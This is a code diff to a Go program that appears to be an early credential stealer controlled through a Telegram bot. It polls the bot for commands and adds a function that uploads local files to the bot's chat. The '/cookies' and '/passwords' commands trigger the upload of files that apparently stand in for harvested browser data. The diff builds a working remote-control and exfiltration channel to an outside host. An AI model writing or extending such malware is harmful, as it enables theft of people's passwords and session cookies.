@@ -1,20 +1,27 @@
 package main 
 
 import (
+	"io"
 	"os"
 	"fmt"
 	"time"
+	"bytes"
+	"strconv"
 	"net/http"
 	"io/ioutil"
+	"path/filepath"
 	"encoding/json"
+	"mime/multipart"
 )
 
 var (
 	token string
 	getUpdates string
+	sendDocument string
 
 	response chan []byte
-	command chan string
+	command chan Message
+	target chan string
 )
 
 type Config struct {
@@ -29,7 +36,7 @@ type Message struct {
 	ID int `json:"message_id"` 
 	Timestamp int `json:"date"`
 	Text string `json:"text"`
-	From Chat `json:"sender_chat"` 
+	From Chat `json:"chat"` 
 }
 
 type Update struct {
@@ -121,19 +128,68 @@ func getCommand() {
 		
 		}	
 
+		if lastCommand == 0 && updates.Results != nil {
+
+			lastCommand = updates.Results[len(updates.Results) - 1].Msg.ID
+
+		}
+
 		if updates.Results[len(updates.Results) - 1].Msg.ID > lastCommand{
 			
 			lastCommand = updates.Results[len(updates.Results) - 1].Msg.ID 
-			
-			command <- updates.Results[len(updates.Results) - 1].Msg.Text 
+		
+			command <- updates.Results[len(updates.Results) - 1].Msg 
 		}
 
 	}
 
 }
 
-func sendDocuments() {
+func fileSender(chatID int, filePath string) {
 	
+	file, err := os.Open(filePath)
+		
+	if err != nil {
+	
+		fmt.Println("Error in opening the file/file path")
+
+	}	
+
+	body := &bytes.Buffer{}
+
+	writer := multipart.NewWriter(body)
+
+	chatIDstr := strconv.Itoa(chatID)
+
+	// Writing the body of the POST request 
+	writer.WriteField("chat_id", chatIDstr)
+
+	writer.WriteField("document", "attach://file")
+
+	// Creating the file part 
+	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
+
+	io.Copy(part, file)
+
+	writer.Close()
+
+	// Creating the request to the bot 
+	req, err := http.NewRequest("POST", sendDocument, body)
+		
+	req.Header.Add("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{}
+
+	res, err := client.Do(req)
+
+	if err != nil {
+
+		fmt.Println(res)
+
+		fmt.Println(err)
+
+	}
+
 }
 
 func execCommand() {
@@ -143,12 +199,12 @@ func execCommand() {
 		
 		cmd := <- command
 			
-		switch cmd {
+		switch cmd.Text {
 		
-			case "/cookies":
-				
+			case "/cookies":	
+				fileSender(cmd.From.ChatID, "ciao.txt")		
 			case "/passwords":
-				
+				fileSender(cmd.From.ChatID, "arrivederci.txt")
 
 		}
 
@@ -159,9 +215,11 @@ func main() {
 	
 	token = readToken()
 	getUpdates = "https://api.telegram.org/bot" + token + "/getUpdates"
+	sendDocument = "https://api.telegram.org/bot" + token + "/sendDocument"
 
 	response = make(chan []byte)
-	command = make(chan string)
+	command = make(chan Message)
+	target = make(chan string)
 
 	go poller(5)
 
